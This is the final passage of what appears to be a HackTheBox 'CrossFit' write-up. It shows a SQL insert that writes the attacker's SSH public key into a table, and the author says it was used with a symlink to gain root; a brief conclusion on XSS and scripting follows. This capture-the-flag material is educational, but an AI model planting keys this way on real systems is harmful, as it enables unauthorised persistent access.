 <pre><span></span><code><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">messages</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="ss">""</span><span class="p">,</span><span class="w"> </span><span class="ss">""</span><span class="p">,</span><span class="w"> </span><span class="ss">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvS6g5B96A8D2JL25Pwe0fZc+LmeecPn71xo2ozSxk5maKZSL/2TQ4Rvm0HbmTKeGElB/mAPw1hTq8FUsvcK++MiMwdEijWGPwXvFMgFGA/YIsKAD/5cvG0ZpkZYi20VvOb6MnafpuCjqgjGFs1a1yYfafVOXadAYkWDvB9gAegeHpW0gAyose/5Z4/K7QuqujfKji6jklQBiPyr+BF+KPSo8cwfaTvkd7j0k1qbeHxS383IUnyF3qi0hxWO4ZZi7iky4pLDY+td++7uc42en6x30kLD2GtC2Px9T7PB3PhfDOJlWS71nuBUy2wqqQp7pwf5Q0ZdNvMajJvkU+9l3y/+02ynRpLG+5ukaZkcyGorwCckWW3AZEzSbHyW9mhSU57lH4NGR7zs0AfQEuQhwFcG+PqGSk2t1dACj1SIt4FoeDm7+qqoDCoSUzY7M4CpYpJLE534gsmh3uyzDY2TR5wNNOxA1CaqZnEnHNv9YS9Vm2eJWpTyukI1eIMvAVlk0= ghost@yourshell"</span><span class="p">);</span><span class="w"></span>
</code></pre>
</div>
<p>
 How I checked to see if my exploit was working correctly was by creating the symbolic link to a file that I could view. When I saw my payload pop into that file I went...
</p>
<p>
 <strong>
  YEEEEEEEEEAAAAAAAAA BOOOI!
 </strong>
</p>
<p>
 It worked and all I had to do was get root!
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/roooooooooooootttttbaaabyyy.png"/>
</p>
<p>
 <strong>
  YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYEEEEEEEEEEEEEEEEEEEEEEEEEEAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBOOOOOOOOOOOOOOIIIIIIIIIIIIII!!!!
 </strong>
</p>
<p>
 <em>
  It was at this point I passed out due to exhaustion and slept for 1 week straight.
 </em>
</p>
</div>
</div>
</section>
<section class="wrapper style1 ">
<div class="inner">
<div class="content">

<h2 class="major" id="conclusion">
 Conclusion
</h2>
<p>
 This machine was
 <em>
  extremely
 </em>
 hard
 <s>
  (insert some sexual innuendo here)
 </s>
 , but one of the most rewarding experiences I have had on HackTheBox so far!
</p>
<p>
 I really enjoyed the XSS scripting for initial and had a tonne of fun writing my little Python script to handle all of the HTTP requests and payload generation. From an aesthetic point of view, I love it when I am exploiting something to have multiple windows up using multiple services to trigger my exploits, makes me feel like a mad hacker. It was also a great opportunity to learn more about XSS and RE that I was
 <em>
  alright
 </em>
 at before, but my skills in those disciplines have significantly improved completing this box.
</p>
<p>
 Now I am going back to bed to continue my recovery after completing this box. I will see you all the next time!
</p></div>
</div>
</section>
</section>

    	</div>

    <!-- Footer -->
      <!-- Footer -->
  <section id="footer">
    <div class="inner">
      <ul class="icons">
        <li><a href="https://twitter.com/GhostCcamm" class="icon brands fa-twitter"><span class="label"></span></a></li>
        <li><a href="https://github.com/Ccamm" class="icon brands fa-github"><span class="label"></span></a></li>
      </ul>
    </div>
  </section>

		<!-- Particles -->
			<div id="particles-js"></div>

		<!-- Scripts -->
			<script src="/assets/js/jquery.min.js"></script>
			<script src="/assets/js/jquery.scrollex.min.js"></script>
			<script src="/assets/js/browser.min.js"></script>
			<script src="/assets/js/breakpoints.min.js"></script>
			<script src="/assets/js/util.js"></script>
			<script src="/assets/js/particles.min.js"></script>
			<script src="/assets/js/main.js"></script>
      
	</body>
</html>